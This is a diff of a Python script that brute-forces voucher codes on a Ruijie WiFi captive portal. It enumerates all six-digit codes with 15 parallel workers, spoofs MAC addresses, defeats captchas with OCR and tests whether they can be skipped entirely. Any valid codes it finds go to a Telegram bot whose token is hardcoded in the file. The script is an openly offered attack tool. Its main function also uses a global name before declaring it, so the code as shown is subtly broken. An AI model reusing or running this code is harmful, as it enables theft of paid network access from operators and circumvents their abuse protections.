@@ -1,32 +1,36 @@
 #!/usr/bin/env python3
 """
-Ruijie WiFi Code Scanner - Fast version
-Session reuse: 1 captcha solve → many code checks (10-50x faster)
+Ruijie WiFi Code Scanner - Optimised
+ - Numeric-only codes: 000000-999999 = only 1 million combos (vs 56B alphanumeric)
+ - Captcha bypass attempt first (many Ruijie setups have captcha disabled)
+ - Session reuse: one captcha solve → 100 code checks
+ - 15 parallel workers
 """
-import asyncio, aiohttp, re, time, random, string, sys, os, io
+import asyncio, aiohttp, re, time, random, sys, os, io, json
 
 BOT_TOKEN   = os.environ.get("BOT_TOKEN",  "8915737207:AAFymbnH_1Ga39WrcoRmfhca73hGhwF4kzY")
 CHAT_ID     = os.environ.get("CHAT_ID",    "5406128711")
 SESSION_URL = os.environ.get("SESSION_URL", "")
 
 CODE_LEN    = 6
-WORKERS     = 10        # more workers = faster
-BATCH_SIZE  = 50        # codes per session before refreshing
-
+WORKERS     = 15
+BATCH       = 100       # codes per captcha solve
 PORTAL      = "https://portal-as.ruijienetworks.com"
 VOUCHER_URL = PORTAL + "/api/auth/voucher/?lang=en_US"
 
-found_codes = []
-checked     = 0
-start_time  = time.time()
+found_codes   = []
+checked       = 0
+captcha_needed = None   # None=unknown, True/False after first test
+start_time    = time.time()
 
+# ── helpers ───────────────────────────────────────────────────────────────────
 def random_mac():
     return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
 
 def replace_mac(url, mac):
     return re.sub(r'mac=[^&]+', f'mac={mac}', url)
 
-async def tg_send(text):
+async def tg(text):
     try:
         async with aiohttp.ClientSession() as s:
             await s.post(
@@ -34,15 +38,23 @@ async def tg_send(text):
                 json={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"},
                 timeout=aiohttp.ClientTimeout(total=10)
             )
-    except:
-        pass
+    except: pass
 
-async def get_session_id(session, session_url):
+HDRS_NAV = {
+    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
+    "accept": "text/html,application/xhtml+xml,*/*",
+}
+HDRS_API = {
+    "content-type": "application/json",
+    "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
+    "origin": PORTAL,
+}
+
+async def get_session_id(session):
     mac = random_mac()
-    url = replace_mac(session_url, mac)
-    hdrs = {"user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"}
+    url = replace_mac(SESSION_URL, mac)
     try:
-        async with session.get(url, headers=hdrs, allow_redirects=True,
+        async with session.get(url, headers=HDRS_NAV, allow_redirects=True,
                                timeout=aiohttp.ClientTimeout(total=10)) as r:
             sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
             return sid.group(1) if sid else None
@@ -50,59 +62,79 @@ async def get_session_id(session, session_url):
         return None
 
 async def get_captcha_image(session, sid):
-    params = {"sessionId": sid, "_t": str(time.time())}
-    hdrs = {
-        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
-        "referer": f"{PORTAL}/download/static/maccauth/src/index.html?sessionId={sid}",
-    }
     try:
         async with session.get(f"{PORTAL}/api/auth/captcha/image",
-                               params=params, headers=hdrs,
+                               params={"sessionId": sid, "_t": str(time.time())},
+                               headers={**HDRS_API, "accept": "image/*"},
                                timeout=aiohttp.ClientTimeout(total=10)) as r:
             return await r.read()
     except:
         return None
 
-async def verify_captcha(session, sid, text):
-    hdrs = {
-        "content-type": "application/json",
-        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
-        "referer": f"{PORTAL}/download/static/maccauth/src/index.html?sessionId={sid}",
-    }
-    try:
-        async with session.post(f"{PORTAL}/api/auth/captcha/verify",
-                                json={"sessionId": sid, "authCode": text},
-                                headers=hdrs,
-                                timeout=aiohttp.ClientTimeout(total=10)) as r:
-            d = await r.json()
-            return d.get("success") == True
-    except:
-        return False
-
 def solve_captcha(image_bytes):
     try:
-        from PIL import Image, ImageFilter, ImageEnhance
+        from PIL import Image, ImageFilter, ImageEnhance, ImageOps
         import pytesseract
         img = Image.open(io.BytesIO(image_bytes)).convert("L")
         img = img.resize((img.width * 3, img.height * 3), Image.LANCZOS)
-        img = ImageEnhance.Contrast(img).enhance(3.0)
-        img = img.filter(ImageFilter.SHARPEN)
-        img = img.point(lambda x: 0 if x < 128 else 255, '1')
-        text = pytesseract.image_to_string(
-            img,
-            config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+        img = ImageEnhance.Contrast(img).enhance(3.5)
+        img = img.filter(ImageFilter.MedianFilter(3))
+        img = img.point(lambda x: 0 if x < 130 else 255, '1')
+        t = pytesseract.image_to_string(
+            img, config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789abcdefghijklmnopqrstuvwxyz'
         )
-        return ''.join(text.strip().split())[:6] or None
+        return ''.join(t.strip().split())[:6] or None
     except:
         return None
 
-async def get_valid_session(session, session_url):
-    """Get sessionId + verified authCode. Retry until success."""
-    for _ in range(20):
-        sid = await get_session_id(session, session_url)
+async def verify_captcha(session, sid, text):
+    try:
+        async with session.post(f"{PORTAL}/api/auth/captcha/verify",
+                                json={"sessionId": sid, "authCode": text},
+                                headers=HDRS_API,
+                                timeout=aiohttp.ClientTimeout(total=10)) as r:
+            d = await r.json()
+            return d.get("success") is True
+    except:
+        return False
+
+async def voucher_post(session, sid, code, auth_code):
+    """POST one voucher. Returns 'found'|'captcha_err'|'rate_limit'|'invalid'|'err'"""
+    data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
+    try:
+        async with session.post(VOUCHER_URL, json=data, headers=HDRS_API,
+                                timeout=aiohttp.ClientTimeout(total=15)) as r:
+            body = await r.text()
+            if "logonUrl" in body:       return "found"
+            if "request limited" in body: return "rate_limit"
+            if "captcha" in body.lower(): return "captcha_err"
+            return "invalid"
+    except:
+        return "err"
+
+# ── captcha bypass test (run once) ───────────────────────────────────────────
+async def test_captcha_needed(session):
+    """Check if this portal requires captcha. Returns True/False."""
+    sid = await get_session_id(session)
+    if not sid:
+        return True   # assume yes
+    # Try posting with empty auth_code
+    result = await voucher_post(session, sid, "000000", "")
+    # If not captcha_err → captcha not enforced
+    print(f"[captcha_test] result={result}")
+    return result == "captcha_err"
+
+# ── get a ready session (sid + auth_code) ────────────────────────────────────
+async def get_ready_session(session):
+    global captcha_needed
+    for _ in range(15):
+        sid = await get_session_id(session)
         if not sid:
             await asyncio.sleep(1)
             continue
+        if not captcha_needed:          # bypass mode — no captcha needed
+            return sid, ""
+        # Need captcha
         for _ in range(10):
             img = await get_captcha_image(session, sid)
             if not img:
@@ -117,127 +149,124 @@ async def get_valid_session(session, session_url):
         await asyncio.sleep(0.5)
     return None, None
 
-async def check_voucher(session, sid, auth_code, code, hdrs):
-    """Check one voucher code. Returns: 'found' | 'captcha_error' | 'rate_limit' | 'invalid'"""
-    data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": auth_code}
-    try:
-        async with session.post(VOUCHER_URL, json=data, headers=hdrs,
-                                timeout=aiohttp.ClientTimeout(total=15)) as r:
-            body = await r.text()
-            if "logonUrl" in body:
-                return "found"
-            if "request limited" in body:
-                return "rate_limit"
-            if "captcha" in body.lower() or "authCode" in body:
-                return "captcha_error"
-            return "invalid"
-    except:
-        return "error"
+# ── numeric code generator (000000-999999, random order) ─────────────────────
+def num_code_generator():
+    """All 6-digit numeric codes in random order — only 1 million total."""
+    codes = list(range(1_000_000))
+    random.shuffle(codes)
+    for n in codes:
+        yield f"{n:06d}"
 
-async def worker(queue, session_url, worker_id):
-    global checked, found_codes
-    hdrs = {
-        "content-type": "application/json",
-        "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36",
-        "origin": PORTAL,
-        "referer": f"{PORTAL}/download/static/maccauth/src/index.html",
-    }
-
+# ── worker ───────────────────────────────────────────────────────────────────
+async def worker(queue, wid):
+    global checked, found_codes, captcha_needed
     async with aiohttp.ClientSession(cookie_jar=aiohttp.CookieJar()) as session:
+
+        # First worker tests captcha requirement once
+        if wid == 1 and captcha_needed is None:
+            captcha_needed = await test_captcha_needed(session)
+            mode = "WITH captcha" if captcha_needed else "NO captcha (bypass!)"
+            print(f"[captcha_test] mode = {mode}")
+            await tg(f"🔍 Captcha mode: <b>{mode}</b>")
+
         while True:
-            # Get a valid session (reuse for BATCH_SIZE codes)
-            sid, auth = await get_valid_session(session, session_url)
+            sid, auth = await get_ready_session(session)
             if not sid:
-                print(f"[W{worker_id}] Cannot get session, retrying...")
+                print(f"[W{wid}] no session — retrying")
                 await asyncio.sleep(3)
                 continue
 
-            print(f"[W{worker_id}] Session OK → checking {BATCH_SIZE} codes")
-
-            for _ in range(BATCH_SIZE):
+            for _ in range(BATCH):
                 code = await queue.get()
                 if code is None:
                     queue.task_done()
                     return
 
-                result = await check_voucher(session, sid, auth, code, hdrs)
+                result = await voucher_post(session, sid, code, auth)
                 checked += 1
 
                 if result == "found":
                     found_codes.append(code)
-                    msg = f"✅ <b>FOUND: {code}</b>\n⏱ {time.strftime('%H:%M:%S')}"
+                    msg = f"✅ <b>FOUND CODE: {code}</b>\n⏱ {time.strftime('%H:%M:%S')}"
                     print(f"\n{'='*40}\n✅ FOUND: {code}\n{'='*40}")
-                    await tg_send(msg)
+                    await tg(msg)
 
-                elif result in ("captcha_error", "rate_limit"):
+                elif result == "captcha_err":
                     queue.task_done()
-                    await asyncio.sleep(1 if result == "captcha_error" else 3)
-                    break  # refresh session
-
-                elif result == "error":
                     await asyncio.sleep(0.5)
+                    break   # refresh session+captcha
+
+                elif result == "rate_limit":
+                    queue.task_done()
+                    await asyncio.sleep(3)
+                    break
 
                 queue.task_done()
 
-def code_generator():
-    chars = string.digits + string.ascii_uppercase
-    while True:
-        yield ''.join(random.choices(chars, k=CODE_LEN))
-
+# ── progress ─────────────────────────────────────────────────────────────────
 async def progress_printer():
-    global checked
-    prev = 0
-    prev_time = time.time()
+    prev, prev_t = 0, time.time()
     while True:
-        await asyncio.sleep(30)
-        now = time.time()
-        rate = (checked - prev) / (now - prev_time)
-        elapsed = int(now - start_time)
-        print(f"[scan] checked={checked} | speed={rate:.1f}/s | found={len(found_codes)} | {elapsed}s elapsed")
-        await tg_send(f"📊 checked={checked} | speed={rate:.1f}/s | found={len(found_codes)}")
-        prev = checked
-        prev_time = now
+        await asyncio.sleep(60)
+        now  = time.time()
+        rate = (checked - prev) / max(now - prev_t, 1)
+        eta  = int((1_000_000 - checked) / max(rate, 0.01))
+        eta_s = f"{eta//3600}h{(eta%3600)//60}m" if eta > 3600 else f"{eta//60}m{eta%60}s"
+        msg  = (f"📊 checked=<b>{checked:,}</b>/1,000,000 | "
+                f"speed=<b>{rate:.1f}/s</b> | found=<b>{len(found_codes)}</b> | ETA={eta_s}")
+        print(f"[scan] {msg}")
+        await tg(msg)
+        prev, prev_t = checked, now
 
+# ── main ─────────────────────────────────────────────────────────────────────
 async def main():
-    session_url = SESSION_URL
-    if not session_url:
-        session_url = input("Ruijie URL ထည့်ပါ: ").strip()
-    if not session_url:
-        sys.exit("URL မပေး — ထွက်မည်")
+    global captcha_needed
+    captcha_needed = None
 
-    print(f"[scan] Workers={WORKERS} | BatchSize={BATCH_SIZE} | CodeLen={CODE_LEN}")
-    print(f"[scan] Starting... found codes → Telegram chat")
-    await tg_send(f"🚀 <b>Scan started</b>\nWorkers: {WORKERS} | Batch: {BATCH_SIZE}\nEach worker reuses session for {BATCH_SIZE} codes before refreshing captcha.")
+    session_url_env = SESSION_URL
+    if not session_url_env:
+        session_url_env = input("Ruijie URL ထည့်ပါ: ").strip()
+    if not session_url_env:
+        sys.exit("URL မပေး")
 
-    queue = asyncio.Queue(maxsize=WORKERS * 10)
-    workers = [asyncio.create_task(worker(queue, session_url, i+1)) for i in range(WORKERS)]
-    progress = asyncio.create_task(progress_printer())
-    stop = asyncio.Event()
+    # patch SESSION_URL into global
+    global SESSION_URL
+    SESSION_URL = session_url_env
+
+    print(f"[scan] Workers={WORKERS} | Batch={BATCH} | Codes=000000-999999 (1M)")
+    await tg(f"🚀 <b>Scan started</b>\nCodes: 000000–999999 (1,000,000 total)\nWorkers: {WORKERS} | Batch: {BATCH}/session\nFound codes → sent here instantly")
+
+    queue = asyncio.Queue(maxsize=WORKERS * 20)
+    tasks = [asyncio.create_task(worker(queue, i+1)) for i in range(WORKERS)]
+    prog  = asyncio.create_task(progress_printer())
+    stop  = asyncio.Event()
 
     async def feeder():
-        gen = code_generator()
-        for code in gen:
-            if stop.is_set():
-                break
+        for code in num_code_generator():
+            if stop.is_set(): break
             await queue.put(code)
         for _ in range(WORKERS):
             await queue.put(None)
 
     feed = asyncio.create_task(feeder())
-    try:
-        await asyncio.gather(*workers)
-    except (KeyboardInterrupt, asyncio.CancelledError):
-        stop.set()
-        feed.cancel()
 
-    progress.cancel()
+    try:
+        await asyncio.gather(*tasks)
+    except (KeyboardInterrupt, asyncio.CancelledError):
+        stop.set(); feed.cancel()
+
+    prog.cancel()
     total = int(time.time() - start_time)
-    summary = f"🏁 Done | checked={checked} | found={len(found_codes)} | {total}s"
-    print(f"\n{summary}")
-    await tg_send(summary)
+    summary = (f"🏁 <b>Scan complete</b>\n"
+               f"Checked: {checked:,}/1,000,000\n"
+               f"Found: {len(found_codes)}\n"
+               f"Codes: {', '.join(found_codes) if found_codes else 'none'}\n"
+               f"Time: {total//60}m {total%60}s")
+    print(summary)
+    await tg(summary)
 
 if __name__ == "__main__":
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
-        print("\n[scan] Stopped by user")
+        print("\nStopped")
